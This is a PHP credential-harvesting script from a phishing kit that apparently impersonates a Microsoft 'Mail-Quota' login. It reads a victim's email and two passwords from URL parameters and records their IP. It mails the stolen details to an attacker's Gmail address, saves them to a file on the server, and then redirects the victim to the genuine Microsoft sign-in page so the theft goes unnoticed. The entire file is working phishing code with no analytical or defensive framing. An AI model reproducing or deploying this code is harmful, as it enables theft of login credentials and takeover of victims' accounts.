<?php error_reporting(0); ?>
<?php $email = $_GET['e']; ?>
<?php $pass = $_GET['p']; ?>
<?php $pass2 = $_GET['p2']; ?>
<?php 
$datex = date("Y-m-d-H-i-s");
$timex = time();
//
$message = "Email: $email  Password: $pass Second Password: $pass2";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
//
$own = 'fabricshunter@gmail.com';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"]; 
//
$sender = 'Mail-Quota';
$subj = "Login: - User IP: $ip | Date: $datex";
$headers .= "From: Mail-Quota<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td><b>***Login Details</b></td></tr>
  <tr><td></td></tr>
   <tr><td>==============================================================</td></tr>
 <tr><td>Email: <b>$email</b><td/></tr>
  <tr><td>Password: <b>$pass</b></td></tr>
  <tr><td>Password2: <b>$pass2</b></td></tr>
 <tr><td>User IP: $ip </td></tr>
 <tr><td>Country: <a href='http://whoer.net/check?host=$ip' target='_blank'>Click here to get Country</a> </td></tr>
 <tr><td>Date and Time: $datex </td></tr>
  </BODY>
 </HTML>";
//send mail
mail($own,$subj,$msg,$headers);
//create and write info into file
$my_file = "../data/File-$datex-$timex.html";
$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
//write into text file
fwrite($handle, $msg);
//close 
fclose($handle);
?>
<script>
	window.location.href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dSqwtKneGZMo9WGlMJpRGpNqwkG0x3jZhwoKm9EI4-TponVNm0_nmJw2hfNUTkr974YG7y7FUct_W3xq2hdaEqKNlY3bvZ7TULBs7FlcFHZ5SEzFDioLPxaGxm0MK2gAa&nonce=636772104731281403.ZTdjMGIwNjUtM2M4OC00MjQ2LThkNDktNzZjYjlhODZhMzA2NjY1ZGY4YmMtMWM1ZS00ZjkwLThhMjgtYWU5NTkyMDQyYTEz&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=26734a05-6c4f-494f-96c8-7b230407a18d";
</script>